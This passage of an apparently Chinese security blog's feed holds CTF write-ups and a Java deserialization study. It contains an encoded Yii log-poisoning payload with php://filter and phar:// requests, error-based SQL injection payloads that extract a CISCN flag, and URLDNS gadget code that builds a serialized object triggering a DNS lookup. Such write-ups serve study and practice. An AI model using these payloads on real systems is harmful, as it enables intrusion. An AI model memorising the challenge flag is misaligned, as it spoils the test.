class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=54=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=74=00=61</span>=<span class="number">00=58=00=51</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=54=00=45</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=63</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=63=00=32</span>=<span class="number">00=39=00=79</span>=<span class="number">00=63=00=79</span>=<span class="number">00=49=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=64=00=58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=77=00=61</span>=<span class="number">00=48=00=42</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=76=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00=30=00=46</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=62</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=59=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=59=00=74</span>=<span class="number">00=67=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=35=00=30</span>=<span class="number">00=65=00=48</span>=<span class="number">00=51=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=48=00=73</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=59=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=59=00=74</span>=<span class="number">00=67=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=47</span>=<span class="number">00=54=00=77</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=65=00=63</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=74=00=50</span>=<span class="number">00=57=00=55</span>=<span class="number">00</span>=<span class="number">65</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=48=00=30</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=71=00=61</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=45</span>=<span class="number">00=64=00=43</span>=<span class="number">00=54=00=55</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span>a</span><br></pre></td></tr></table></figure><p>清除其他字符</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://dd60ec6c<span class="number">-4197</span><span class="number">-4</span>c9b<span class="number">-8</span>dd0<span class="number">-8651</span>a607fa70.node3.buuoj.cn/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.quoted-printable-decode|<span class="built_in">convert</span>.iconv.utf<span class="number">-16</span>le.utf<span class="number">-8</span>|<span class="built_in">convert</span>.base64-decode/resource=../runtime/logs/app.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>phar序列化</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>dd60ec6c-<span class="number">4197</span>-<span class="number">4</span>c9b-<span class="number">8</span>dd0-<span class="number">8651</span>a607fa70.node3.buuoj.cn<span class="regexp">/?file=phar:/</span><span class="regexp">/../</span>runtime<span class="regexp">/logs/</span>app.log</span><br></pre></td></tr></table></figure><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520143637.png" alt="image-20210520143635914"></p><p>和Laravel Debug RCE的区别？</p><p>日志中只出现一次完整payload，还有一次到15字符省略的payload</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520143951.png" alt="image-20210520143950955"></p><p>因为在utf-16le-&gt;utf-8的时候必须要求是偶数字节，不然会报错，所以在Laravel Debug RCE的时候会先发送一个AA的文件名让日志必定为偶数字节</p><p>在yii这里测试的时候本身就是偶字节的原因，就不需要提前发了，但是在调试Laravel的时候需要注意</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://w4nder.top/?p=451" target="_blank" rel="noopener">http://w4nder.top/?p=451</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;headerlink&quot; title=&quot;easy_sql&quot;&gt;&lt;/a&gt;easy_sql&lt;/h2&gt;&lt;p&gt;报错注入，盲猜flag表，但不知道名称，用重复column名爆列名&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;无列名注入小记&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;uname=%27)&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;||&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;flag&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;*&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;*&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;flag&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; a&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;flag&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;b&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;using&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;id&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;no&lt;/span&gt;))&lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;c))&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;1&amp;amp;passwd=1&amp;amp;Submit=%E7%99%BB%E5%BD%95&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518133714.png&quot; alt=&quot;image-20210518133713042&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight autohotkey&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;uname=%&lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;)&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;literal&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;extractvalue(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,concat(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x7e,(select&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;substr(`e691d77e-&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;da1-&lt;span class=&quot;number&quot;&gt;409&lt;/span&gt;b-a37b-ff4edfa14123`,&lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;)&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;from&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;flag),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x7e))&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;literal&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;(&#39;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;amp;passwd=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;amp;Submit=&lt;span class=&quot;variable&quot;&gt;%E7%&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;%BB%&lt;/span&gt;E5&lt;span class=&quot;variable&quot;&gt;%BD%&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;95&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;uname=%&lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;)&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;literal&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;extractvalue(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,concat(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x7e,(select&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;substr(`e691d77e-&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;da1-&lt;span class=&quot;number&quot;&gt;409&lt;/span&gt;b-a37b-ff4edfa14123`)&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;from&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;flag),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x7e))&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;literal&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;(&#39;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;amp;passwd=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;amp;Submit=&lt;span class=&quot;variable&quot;&gt;%E7%&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;%BB%&lt;/span&gt;E5&lt;span class=&quot;variable&quot;&gt;%BD%&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;95&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;读出flag CISCN{9fO5F-WC2YL-GY3zM-R4aIu-kAjxU-}&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="PHP" scheme="https://jlkl.github.io/tags/PHP/"/>
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS&amp;Commons Collections 1-7</title>
    <link href="https://jlkl.github.io/2021/04/13/Java_04/"/>
    <id>https://jlkl.github.io/2021/04/13/Java_04/</id>
    <published>2021-04-13T08:47:46.000Z</published>
    <updated>2021-04-13T08:55:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大部分参照<strong>p1g3@D0g3</strong>师傅的文章，先入概念太重了，就当放个笔记吧</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p><code>URLDNS</code> 完全使用Java内置的类构造，无需第三方库支持。不能执行命令，通常用来验证目标是否存在反序列化漏洞。</p><ul><li>只依赖原生类</li><li>不限制jdk版本</li></ul><p>测试环境：jdk 11u8</p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">HashMap</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HashMap</span>.</span></span>hash<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">URL</span>.</span></span>hash<span class="constructor">Code()</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">URLStreamHandler</span>.</span></span>hash<span class="constructor">Code()</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">URLStreamHandler</span>.</span></span>get<span class="constructor">HostAddress()</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p><code>HashMap</code> 重写了 <code>readObject</code>，这里使用 <code>hash</code> 函数来处理 key，得到 hashcode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    …………</span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>hash</code> 方法，当 <code>key</code>  不为 <code>null</code> 时，这里直接调用了 <code>key</code> 的 <code>hashCode</code> 方法</p><img src="/2021/04/13/Java_04/20210318153350.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>跟进 <code>URL</code> 类的 <code>hashCode</code> 方法，当 <code>hashCOde</code> 值为 <code>-1</code> 的时候，调用 <code>handler</code> 的 <code>hashCode</code> 函数</p><img src="/2021/04/13/Java_04/20210318155317.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>这里使用的 handler 默认是 <code>URLStreamHandler</code> 类，其 <code>hashCode</code> 函数内 <code>getHostAddress</code> 函数会对目标发起 DNS 请求，所以可以构造恶意序列化数据，看是否收到 DNS 请求来判断目标是否存在反序列化漏洞。</p><img src="/2021/04/13/Java_04/20210318154632.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>再回到 <code>HashMap</code> 的 <code>readObject</code> 函数，这里 <code>key</code> 和 <code>value</code> 的值是通过 <code>readObject</code> 函数从序列化数据中读出，那么 <code>writeObject</code> 函数必定有写入 key 和 value 的操作</p><img src="/2021/04/13/Java_04/20210318155819.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>跟进 <code>writeObject</code> 函数，这里主要是这个 <code>internalWriteEntries</code> 函数</p><img src="/2021/04/13/Java_04/20210318160629.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>继续跟进，发现这里是从 <code>tab</code> 里面获取 key 和 value，而这个 <code>tab</code> 其实就是 HashMap 的 <code>table</code> ，用于存储所有的数据，数据的改变需要用到 <code>put</code> 函数</p><img src="/2021/04/13/Java_04/20210318160936.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>跟进 <code>put</code> 函数，这里同样调用了 <code>hash</code> 函数，那么同理也会进行 DNS 请求。</p><img src="/2021/04/13/Java_04/20210318161031.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>那么如何阻止 <code>put</code> 时发起第一次 DNS 请求，URL 类 <code>hashCOde</code> 函数内，当 <code>hashCode</code> 不为 <code>-1</code>，会结束调用，于是在 <code>put</code> 前设置 <code>hashCode</code> 不为 <code>-1</code> ，在 put 之后，序列化对象之前再设置 <code>-1</code> 即可。 </p><img src="/2021/04/13/Java_04/20210318161219.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>可以这样理解，在序列化 HashMap 类对象的时候，为了减少序列化后数据的大小，并没有将整个哈希表保存进去仅保存了所有数据的 key 和 value，这样在反序列化对象的时候，就需要重新根据 key 去计算 hash，而 URL 这个类在计算 hash 的时候会调用 <code>getHostAddress</code>  查询主机地址，自然就会放出 DNS 请求。</p><h4 id="yso-中利用分析"><a href="#yso-中利用分析" class="headerlink" title="yso 中利用分析"></a>yso 中利用分析</h4><img src="/2021/04/13/Java_04/20210318162306.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>yso 阻止第一次 DNS 请求的方法就比较巧妙了，这里的 URL 构造函数有三个参数，查阅文档，这里其实是自定义了一个 handler，<code>SilentURLStreamHandler</code></p><img src="/2021/04/13/Java_04/20210318162608.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>然后重写 <code>getHostAddress</code> 函数，直接返回为 <code>null</code> ，不会进行 DNS 请求，简单粗暴</p><img src="/2021/04/13/Java_04/20210318162650.png" style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><p>因为 <code>java.net.URL.handle</code> 是标记 <code>transient</code> 的，不会被序列化进去，从而不会影响漏洞的利用</p><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>URLDNS.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxxx.dnslog.cn"</span>);</span><br><span class="line">        <span class="comment">//反射访问属性</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);<span class="comment">// 设一个值, 这样 put 的时候就不会去查询 DNS,不为 -1 均可</span></span><br><span class="line">        hashMap.put(url, <span class="string">"Str3am"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);<span class="comment">// hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化对象并写入文件</span></span><br><span class="line">        ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        obout.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Main.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//从文件读取并反序化文件</span></span><br><span class="line">        ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        obin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/04/13/Java_04/20210318164412.png" 